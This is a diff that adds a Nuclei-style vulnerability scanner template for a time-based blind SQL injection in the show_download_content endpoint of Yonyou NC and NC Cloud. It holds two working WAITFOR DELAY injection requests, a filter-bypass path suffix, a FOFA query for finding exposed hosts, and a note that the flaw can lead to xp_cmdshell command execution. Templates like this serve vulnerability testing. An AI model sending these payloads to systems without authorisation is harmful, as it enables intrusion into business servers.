@@ -1,0 +1,42 @@
+id: yongyouNC-Cloud-show_download_content-sql
+
+info:
+  name: "用友NC及NC Cloud show_download_content接口SQL时间盲注"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: app="用友-NC-Cloud"
+      用友NC及NC Cloud系统中/ebvp/infopub/show_download_content接口存在SQL时间盲注安全缺陷。攻击者可通过构造特定时间延迟注入请求，利用MSSQL数据库的xp_cmdshell扩展存储过程执行任意系统命令，实现对目标服务器的控制。该漏洞攻击复杂度低，建议受影响用户立即部署防护措施。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487215&idx=1&sn=ee83124f6ab762537497ef55f1639001&chksm=c267bbdcf51032ca2b2ff4e1d56577be9caddfa3e7933eb570af312b56951ef18ade005bd62c&token=101124693&lang=zh_CN#rd
+  tags: 用友
+
+
+
+http:
+- raw:
+  - |
+    GET /ebvp/infopub/show_download_content;.js?id=1';WAITFOR+DELAY+'0:0:4'-- HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
+
+
+  - |
+    GET /ebvp/infopub/show_download_content;.js?id=1';WAITFOR+DELAY+'0:0:8'-- HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
+
+
+  matchers:
+  - type: dsl
+    dsl:
+    - 'duration_1>=4 && duration_1<=5'
+    - 'duration_2>=8 && duration_2<=9'
+    condition: and
+
+
+
+
+
+
+
